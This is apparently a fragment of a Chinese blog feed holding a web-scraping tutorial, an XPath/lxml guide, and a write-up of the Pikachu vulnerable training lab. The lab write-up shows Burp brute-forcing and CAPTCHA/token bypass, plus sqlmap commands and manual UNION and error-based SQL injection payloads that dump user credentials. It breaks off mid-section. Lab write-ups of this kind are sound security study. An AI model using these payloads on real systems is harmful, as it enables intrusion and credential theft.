js渲染--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//提前准备好的数据</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> users = [</span></span><br><span class="line"><span class="language-javascript">            &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;王麻子&#x27;</span>, <span class="attr">age</span>: <span class="number">38</span>&#125;</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取tbody标签</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;tbody&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.循环遍历users数据</span></span></span><br><span class="line"><span class="language-javascript">        users.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//这里的item 就是数组中的每一个对象</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(item)</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//2. 每一个对象生成一个tr标签</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> tr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;tr&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//循环遍历item</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> item)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//生成td标签</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> td = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;td&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">                td.<span class="property">innerHTML</span> = item[key]</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//5.把td 插入到tr内部</span></span></span><br><span class="line"><span class="language-javascript">                tr.<span class="title function_">appendChild</span>(td)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//把本次的tr插入到tbody的内部</span></span></span><br><span class="line"><span class="language-javascript">            tbody.<span class="title function_">appendChild</span>(tr)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样做的好处是服务器那边能缓解压力. 而且分工明确. 比较容易维护. 典型的有这么一个网页</p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215175207478.png" alt="image-20201215175207478"></p><p>那数据是何时加载进来的呢?  其实就是在我们进行页面向下滚动的时候, jd就在偷偷的加载数据了, 此时想要看到这个页面的加载全过程, 我们就需要借助浏览器的调试工具了(F12)</p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215175536447.png" alt="image-20201215175536447"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215175637599.png" alt="image-20201215175637599"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215175848471.png" alt="image-20201215175848471"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215180141450.png" alt="image-20201215180141450"></p><p>看到了吧, 页面上看到的内容其实是后加载进来的.</p></li></ol><p>OK, 在这里我不是要跟各位讲jd有多牛B, 也不是说这两种方式有什么不同, 只是想告诉各位, 有些时候, 我们的数据不一定都是直接来自于页面源代码.  如果你在页面源代码中找不到你要的数据时, 那很可能数据是存放在另一个请求里. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.你要的东西在页面源代码. 直接拿`源代码`提取数据即可</span><br><span class="line">2.你要的东西，不在页面源代码, 需要想办法找到真正的加载数据的那个请求. 然后提取数据</span><br></pre></td></tr></table></figure><h2 id="二、浏览器工具的使用"><a href="#二、浏览器工具的使用" class="headerlink" title="二、浏览器工具的使用"></a>二、浏览器工具的使用</h2><p>Chrome是一款非常优秀的浏览器. 不仅仅体现在用户使用上. 对于我们开发人员而言也是非常非常好用的. </p><p>对于一名爬虫工程师而言. 浏览器是最能直观的看到网页情况以及网页加载内容的地方. 我们可以按下F12来查看一些普通用户很少能使用到的工具. </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519194028187.png" alt="image-20210519194028187"></p><p>其中, 最重要的Elements, Console, Sources, Network. </p><p>Elements是我们实时的网页内容情况, 注意, 很多兄弟尤其到了后期. 非常容易混淆Elements以及页面源代码之间的关系. </p><blockquote><p>注意,  </p><ol><li>页面源代码是执行js脚本以及用户操作之前的服务器返回给我们最原始的内容</li><li>Elements中看到的内容是js脚本以及用户操作之后的当时的页面显示效果.</li></ol></blockquote><p>你可以理解为, 一个是老师批改之前的卷子, 一个是老师批改之后的卷子. 虽然都是卷子. 但是内容是不一样的. 而我们目前能够拿到的都是页面源代码. 也就是老师批改之前的样子. 这一点要格外注意. </p><p>在Elements中我们可以使用左上角的小箭头.可以直观的看到浏览器中每一块位置对应的当前html状况. 还是很贴心的. </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519194515866.png" alt="image-20210519194515866"></p><p>第二个窗口, Console是用来查看程序员留下的一些打印内容, 以及日志内容的. 我们可以在这里输入一些js代码自动执行. </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519194811565.png" alt="image-20210519194811565"></p><p>等咱们后面讲解js逆向的时候会用到这里.</p><p>第三个窗口, Source, 这里能看到该网页打开时加载的所有内容. 包括页面源代码. 脚本. 样式, 图片等等全部内容. </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519195035084.png" alt="image-20210519195035084"></p><p>第四个窗口, Network, 我们一般习惯称呼它为抓包工具. 在这里, 我们能看到当前网页加载的所有网路网络请求, 以及请求的详细内容. 这一点对我们爬虫来说至关重要. </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519195221734.png" alt="image-20210519195221734"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519195336616.png" alt="image-20210519195336616"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519195502709.png" alt="image-20210519195502709"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20210519195613396.png" alt="image-20210519195613396"></p><p>其他更加具体的内容. 随着咱们学习的展开. 会逐一进行讲解. </p><h2 id="三、反爬虫的一般手段"><a href="#三、反爬虫的一般手段" class="headerlink" title="三、反爬虫的一般手段"></a>三、反爬虫的一般手段</h2><p>爬虫项目最复杂的不是页面信息的提取，反而是爬虫与反爬虫、反反爬虫的博弈过程</p><ul><li><p>User-Agent</p><p>浏览器的标志信息，会通过请求头传递给服务器，用以说明访问数据的浏览器信息</p><p>反爬虫：先检查是否有UA，或者UA是否合法</p></li><li><p>代理IP</p></li><li><p>验证码访问</p></li><li><p>动态加载网页</p></li><li><p>数据加密</p></li><li><p>…</p></li></ul><h2 id="四、常见HTTP状态码"><a href="#四、常见HTTP状态码" class="headerlink" title="四、常见HTTP状态码"></a>四、常见HTTP状态码</h2><ul><li><p>200：这个是最常见的http状态码，表示服务器已经成功接受请求，并将返回客户端所请</p></li><li><p>100-199 用于指定客户端应相应的某些动作。</p></li><li><p>200-299 用于表示请求成功。</p></li><li><p>300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。</p></li><li><p>400-499 用于指出客户端的错误。</p><ul><li>404：请求失败，客户端请求的资源没有找到或者是不存在</li></ul></li><li><p>500-599 服务器遇到未知的错误，导致无法完成客户端当前的请求。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xpath</title>
      <link href="/2023/12/28/xpath/"/>
      <url>/2023/12/28/xpath/</url>
      
        <content type="html"><![CDATA[<h1 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h1><h3 id="1、xpath安装与使用"><a href="#1、xpath安装与使用" class="headerlink" title="1、xpath安装与使用"></a>1、xpath安装与使用</h3><p><strong>安装</strong></p><ul><li><p>安装lxml库</p><p>pip install lxml  -i pip源</p></li></ul><h3 id="2、解析流程与使用"><a href="#2、解析流程与使用" class="headerlink" title="2、解析流程与使用"></a>2、解析流程与使用</h3><p><strong>解析流程</strong></p><ul><li>实例化一个etree的对象，把即将被解析的页面源码加载到该对象</li><li>调用该对象的xpath方法结合着不同形式的xpath表达进行标签定位和数据提取</li></ul><p><strong>使用</strong></p><ul><li><p>导入lxml.etree</p><p>from lxml import etree</p></li><li><p>etree.parse()</p><p>解析本地html文件</p><p>html_tree &#x3D; etree.parse(‘XX.html’)</p></li><li><p>etree.HTML()(建议)</p><p>解析网络的html字符串</p><p>html_tree &#x3D; etree.HTML(html字符串)</p></li><li><p>html_tree.xpath()</p><p>使用xpath路径查询信息，返回一个列表</p></li></ul><p>注意：如果lxml解析本地HTML文件报错可以安装如下添加参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parser = etree.HTMLParser(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">selector = etree.parse(<span class="string">&#x27;./lol_1.html&#x27;</span>,parser=parser)</span><br><span class="line">result=etree.tostring(selector)</span><br></pre></td></tr></table></figure><h3 id="3、xpath语法"><a href="#3、xpath语法" class="headerlink" title="3、xpath语法"></a>3、xpath语法</h3><p>XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中通过元素和属性进行导航。</p><ul><li><p><strong>路径表达式</strong></p><table><thead><tr><th align="left">表达式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&#x2F;</td><td align="left">从根节点选取。</td></tr><tr><td align="left">&#x2F;&#x2F;</td><td align="left">从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td></tr><tr><td align="left">.&#x2F;</td><td align="left">当前节点再次进行xpath</td></tr><tr><td align="left">@</td><td align="left">选取属性。</td></tr></tbody></table><p><strong>实例</strong></p><p>在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：</p><table><thead><tr><th align="left">路径表达式</th><th align="left">结果</th></tr></thead><tbody><tr><td align="left">&#x2F;html</td><td align="left">选取根元素。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！</td></tr><tr><td align="left">&#x2F;&#x2F;li</td><td align="left">选取所有li 子元素，而不管它们在文档中的位置。</td></tr><tr><td align="left">&#x2F;&#x2F;ul&#x2F;&#x2F;li</td><td align="left">选择属于 ul元素的后代的所有 li元素，而不管它们位于 ul之下的什么位置。</td></tr><tr><td align="left">节点对象.xpath(‘.&#x2F;div’)</td><td align="left">选择当前节点对象里面的第一个div节点</td></tr><tr><td align="left">&#x2F;&#x2F;@href</td><td align="left">选取名为 href 的所有属性。</td></tr></tbody></table></li><li><p><strong>谓语（Predicates）</strong></p><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p><p>谓语被嵌在方括号中。</p><p><strong>实例</strong></p><p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><table><thead><tr><th align="left">路径表达式</th><th align="left">结果</th></tr></thead><tbody><tr><td align="left">&#x2F;ul&#x2F;li[1]</td><td align="left">选取属于 ul子元素的第一个 li元素。</td></tr><tr><td align="left">&#x2F;ul&#x2F;li[last()]</td><td align="left">选取属于 ul子元素的最后一个 li元素。</td></tr><tr><td align="left">&#x2F;ul&#x2F;li[last()-1]</td><td align="left">选取属于 ul子元素的倒数第二个 li元素。</td></tr><tr><td align="left">&#x2F;&#x2F;ul&#x2F;li[position()&lt;3]</td><td align="left">选取最前面的两个属于 ul元素的子元素的 li元素。</td></tr><tr><td align="left">&#x2F;&#x2F;a[@title]</td><td align="left">选取所有拥有名为 title的属性的 a元素。</td></tr><tr><td align="left">&#x2F;&#x2F;a[@title&#x3D;’xx’]</td><td align="left">选取所有 a元素，且这些元素拥有值为 xx的 title属性。</td></tr><tr><td align="left">&#x2F;&#x2F;a[@title&gt;10]   <code>&gt; &lt; &gt;= &lt;= !=</code></td><td align="left">选取 a元素的所有 title元素，且其中的 title元素的值须大于 10。</td></tr><tr><td align="left">&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title</td><td align="left">选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td></tr></tbody></table></li><li><p><strong>选取未知节点</strong></p><p>XPath 通配符可用来选取未知的 XML 元素。</p><table><thead><tr><th align="left">通配符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">匹配任何元素节点。  一般用于浏览器copy xpath会出现</td></tr><tr><td align="left">@*</td><td align="left">匹配任何属性节点。</td></tr><tr><td align="left">node()</td><td align="left">匹配任何类型的节点。</td></tr></tbody></table><p><strong>实例</strong></p><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th align="left">路径表达式</th><th align="left">结果</th></tr></thead><tbody><tr><td align="left">&#x2F;ul&#x2F;*</td><td align="left">选取 ul元素的所有子元素。</td></tr><tr><td align="left">&#x2F;&#x2F;*</td><td align="left">选取文档中的所有元素。</td></tr><tr><td align="left">&#x2F;&#x2F;title[@*]</td><td align="left">选取所有带有属性的 title 元素。</td></tr><tr><td align="left">&#x2F;&#x2F;node()</td><td align="left">获取所有节点</td></tr></tbody></table><p><strong>选取若干路径</strong></p><p>通过在路径表达式中使用“|”运算符，您可以选取若干个路径。</p><p><strong>实例</strong></p><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th align="left">路径表达式</th><th align="left">结果</th></tr></thead><tbody><tr><td align="left">&#x2F;&#x2F;book&#x2F;title | &#x2F;&#x2F;book&#x2F;price</td><td align="left">选取 book 元素的所有 title 和 price 元素。</td></tr><tr><td align="left">&#x2F;&#x2F;title | &#x2F;&#x2F;price</td><td align="left">选取文档中的所有 title 和 price 元素。</td></tr><tr><td align="left">&#x2F;bookstore&#x2F;book&#x2F;title | &#x2F;&#x2F;price</td><td align="left">选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td></tr></tbody></table></li><li><p>逻辑运算</p><ul><li><p>查找所有id属性等于head并且class属性等于s_down的div标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[@<span class="built_in">id</span>=<span class="string">&quot;head&quot;</span> <span class="keyword">and</span> @<span class="keyword">class</span>=<span class="string">&quot;s_down&quot;</span>]</span><br></pre></td></tr></table></figure></li><li><p>选取文档中的所有 title 和 price 元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//title | //price</span><br></pre></td></tr></table></figure><p>注意: “|”两边必须是完整的xpath路径</p></li></ul></li><li><p>属性查询</p><ul><li><p>查找所有包含id属性的div节点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[@<span class="built_in">id</span>]</span><br></pre></td></tr></table></figure></li><li><p>查找所有id属性等于maincontent的div标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[@<span class="built_in">id</span>=<span class="string">&quot;maincontent&quot;</span>]</span><br></pre></td></tr></table></figure></li><li><p>查找所有的class属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//@<span class="keyword">class</span></span><br></pre></td></tr></table></figure></li><li><p>&#x2F;&#x2F;@attrName</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//li[@name=<span class="string">&quot;xx&quot;</span>]//text()  <span class="comment"># 获取li标签name为xx的里面的文本内容</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>获取第几个标签  索引从1开始</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tree.xpath(<span class="string">&#x27;//li[1]/a/text()&#x27;</span>)  <span class="comment"># 获取第一个</span></span><br><span class="line">tree.xpath(<span class="string">&#x27;//li[last()]/a/text()&#x27;</span>)  <span class="comment"># 获取最后一个</span></span><br><span class="line">tree.xpath(<span class="string">&#x27;//li[last()-1]/a/text()&#x27;</span>)  <span class="comment"># 获取倒数第二个</span></span><br></pre></td></tr></table></figure></li><li><p>模糊查询</p><ul><li><p>查询所有id属性中包含he的div标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[contains(@<span class="built_in">id</span>, <span class="string">&quot;he&quot;</span>)]</span><br></pre></td></tr></table></figure></li><li><p>查询所有id属性中包以he开头的div标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[starts-<span class="keyword">with</span>(@<span class="built_in">id</span>, <span class="string">&quot;he&quot;</span>)]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>内容查询</p><p>查找所有div标签下的直接子节点h1的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div/h1/text()</span><br></pre></td></tr></table></figure></li><li><p>属性值获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div/a/@href   获取a里面的href属性值</span><br></pre></td></tr></table></figure></li><li><p>获取所有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//*  <span class="comment">#获取所有</span></span><br><span class="line">//*[@<span class="keyword">class</span>=<span class="string">&quot;xx&quot;</span>]  <span class="comment">#获取所有class为xx的标签</span></span><br></pre></td></tr></table></figure></li><li><p>获取节点内容转换成字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = tree.xpath(<span class="string">&#x27;//li/a&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">result=etree.tostring(c, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场</title>
      <link href="/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。</p><h3 id="1-基于表单的暴力破解"><a href="#1-基于表单的暴力破解" class="headerlink" title="1.基于表单的暴力破解"></a>1.基于表单的暴力破解</h3><p><img src="/../images/pikachu.assets/1.png"></p><p>看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包</p><p>然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456</p><p><img src="/../images/pikachu.assets/2.png"></p><h3 id="2-验证码绕过-on-server"><a href="#2-验证码绕过-on-server" class="headerlink" title="2.验证码绕过(on server)"></a>2.验证码绕过(on server)</h3><p>1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。</p><p>2.打开bp，右击选择send to repeater，把请求发送到 repeater</p><p>3.打开Repeater，点击GO,观察状态。</p><p>4.这时，右侧会显示验证码不能为空，因为此前没有输入验证码</p><p>5.如果随便输入一个验证码，此时显示验证码错误！</p><p>6.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！</p><p>7.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！步骤和基于表单的暴力破解是一样。将Proxy中抓到的，右击发送到Intruder，然后添加账户和密码变量，放入字典。</p><p>（第一题知道了他账号密码，所以就直接不上字典了）</p><p><img src="/../images/pikachu.assets/3.png"></p><h3 id="3-验证码绕过-on-click"><a href="#3-验证码绕过-on-click" class="headerlink" title="3.验证码绕过(on click)"></a>3.验证码绕过(on click)</h3><p>验证码输入正确、为空、输入错误分别提示login success，请输入验证码，验证码输入错误。</p><p>什么都不输入或只输入用户名和密码点击登录，页面弹出“请输入验证码！”的提示框，而不是用户名和密码不存在</p><p>我们查看源码，输入的验证码在本地验证，我们可以在burp suite不输入验证码或者输入错的验证码完成爆破</p><p>burp suite抓包，删除验证码，发送到intruder模块</p><p><img src="/../images/pikachu.assets/4.png"></p><h3 id="4-token防爆破？"><a href="#4-token防爆破？" class="headerlink" title="4.token防爆破？"></a>4.token防爆破？</h3><p>这一关增加的Token值，用来防止爆破，不过在多次抓包在之后，发现每次返回的数据中含有下一次的Token值</p><p><img src="/../images/pikachu.assets/5.png"></p><p>满足以上条件我们就可以使用burp的音叉攻击进行爆破，线程必须为1，参数为password和token</p><p><img src="/../images/pikachu.assets/6.png"></p><p>password载荷设置：</p><p><img src="/../images/pikachu.assets/7.png"></p><p>上图中，第五步复制的value值放入下图中：</p><p><img src="/../images/pikachu.assets/8.png"></p><p>开始攻击</p><p><img src="/../images/pikachu.assets/9.png"></p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1. 数字型注入"></a>1. 数字型注入</h3><p>提示提交方式为post，使用手注</p><p>使用bp抓包并发送到Repeater</p><p><img src="/../images/pikachu.assets/10.png"></p><p>判断列数为2</p><p><img src="/../images/pikachu.assets/11.png"></p><p><img src="/../images/pikachu.assets/12.png"></p><p>查库</p><p><img src="/../images/pikachu.assets/13.png"></p><p>查表</p><p><img src="/../images/pikachu.assets/14.png"></p><p>查列</p><p><img src="/../images/pikachu.assets/15.png"></p><p>查数据</p><p><img src="/../images/pikachu.assets/16.png"></p><p>可知密码通过md5加密，使用账号&#x2F;密码为admin&#x2F;123456</p><p><img src="/../images/pikachu.assets/17.png"></p><h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h3><p>提示为字符型，且提交方式为get，使用sqlmap</p><p><img src="/../images/pikachu.assets/18.png"></p><p>查询数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; --dbs</span><br></pre></td></tr></table></figure><p><img src="/../images/pikachu.assets/19.png"></p><p>查询数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu --tables</span><br></pre></td></tr></table></figure><p><img src="/../images/pikachu.assets/20.png"></p><p>查询数据表中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu -T users --dump</span><br></pre></td></tr></table></figure><p><img src="/../images/pikachu.assets/21.png"></p><h3 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//手注Payload:</span><br><span class="line">&#x27; order by 3  # //爆回显位</span><br><span class="line">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #  //爆数据表名</span><br><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users #  //爆字段名</span><br><span class="line">&#x27; union select 1,username,password from users #  //爆字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-insert-update注入"><a href="#4-insert-update注入" class="headerlink" title="4.insert&#x2F;update注入"></a>4.insert&#x2F;update注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//sqlmapPayload:</span><br><span class="line">sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_iu/sqli_reg.php&quot;  --data=&quot;username=1111&amp;password=1&amp;sex=1&amp;phonenum=1&amp;email=1&amp;add=1&amp;submit=submit&quot;  --dbs</span><br><span class="line">余下步骤与第二题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-delete注入"><a href="#5-delete注入" class="headerlink" title="5.delete注入"></a>5.delete注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注（报错注入）</span><br><span class="line">//手注Payload:</span><br><span class="line">and updatexml(1,concat(0x7e,(select database()),0x7e),1) //查询库</span><br><span class="line">//余下步骤与第七题一样</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-http头注入"><a href="#7-http头注入" class="headerlink" title="7.http头注入"></a>7.http头注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//在bp中手注（报错注入）</span><br><span class="line">//手注Payload:</span><br><span class="line">1&#x27; update(0,concat(0x7b,database()),1) or &#x27; //查库</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,31)),1) or &#x27; //查表</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31)),1) or &#x27; //查字段名</span><br><span class="line">&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(username,&#x27;:&#x27;,password) from users),1,31)),1) or &#x27; //查字段值</span><br><span class="line">//报错误注入会限制整数，可修改查询语句来查询未查询信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-基于boolian的盲注"><a href="#8-基于boolian的盲注" class="headerlink" title="8.基于boolian的盲注"></a>8.基于boolian的盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 